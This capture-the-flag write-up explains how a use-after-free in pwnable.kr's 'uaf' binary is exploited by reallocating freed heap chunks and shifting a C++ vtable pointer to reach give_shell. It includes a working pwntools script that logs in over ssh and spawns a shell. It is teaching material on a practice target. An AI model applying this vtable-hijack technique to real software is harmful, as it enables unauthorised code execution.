Note: a vtable is associated to a class, and allocated objects of the class in the heap (with the new keyword) will include a chunk containing their vtable address. vtables are present in the binary. 

When we want to call functions defined inside the class, their addresses will be found in the vtable corresponding to the address present in the object's heap chunk.

In this challenge, after freeing the chunks, we can overwrite the chunks of size ``0x20`` (that contain vtable address) by the content of the file passed in ``argv[2]``. We will specify a size of 0x18 to ensure it is the ``0x20``-sized chunks that are going to be reused (0x18 will be 16-bit aligned to 0x20).

Moreover, we have a use after free vulnerability: ``m->introduce`` (supposed to call ``Man::introduce``) can still be called after the free. We are going to exploit this by modifying the address of the vtable used by the ``m`` object, thus to make it call the ``give_shell`` function.

``introduce`` is the second function for Man vtable. We have:
``*(man_vtable+0x10)``   is ``give_shell`` address
``*(man_vtable+0x10+8)`` is ``introduce``  address

Note: first function in the vtable is after a 0x10 offset. In the heap, it is ``vtable+0x10`` that is stored.

If we decrease ``(vtable+0x10)`` address by 8, trying to call ``m->introduce`` will result in calling ``m->give_shell``.

Let's load the binary to get the Man vtable address.
```python
from pwn import *
elf = ELF("uaf")
```
first function of the old vtable (give_shell) :
```python
old_vtable_1F =  elf.symbols["_ZTV3Man"]+0x10
```
give_shell takes the place of introduce as second function :
```python
new_vtable_1F =  old_vtable_1F-8
```
Now let's write our new vtable address into a file, so the content of the file will be stored in the heap chunk containing our objects' vtable. When we debug the binary, we clearly see that this chunk is located after another chunk of 0x30 containing the object's name and age variables, and its size is 0x20. That is why we specified an 0x18 address: so doing, it will realign the 0x18 size to 0x20, and it will be looking for a free 0x20 chunk, then it will find chunks containing vtable (for ``w`` then for ``m``).

```python
shell = ssh("uaf", "pwnable.kr", password="guest", port=2222)
p = shell.process(["./uaf", "24", "/dev/stdin"])

p.sendline("3") ; p.recv()
p.sendline("2")
p.send(p64(new_vtable_1F)) ; p.recv()
p.sendline("2") ; p.recv()
```
It's the ``w`` heap chunk containing vtable that is going to be reused the first time. So we have to store the payload twice, since ``m->introduce`` is called before ``w->introduce``.
```python
p.sendline("2") ; p.recv()
p.sendline("1") ;p.recv()
```
We got the shell.
```python
p.interactive()
```
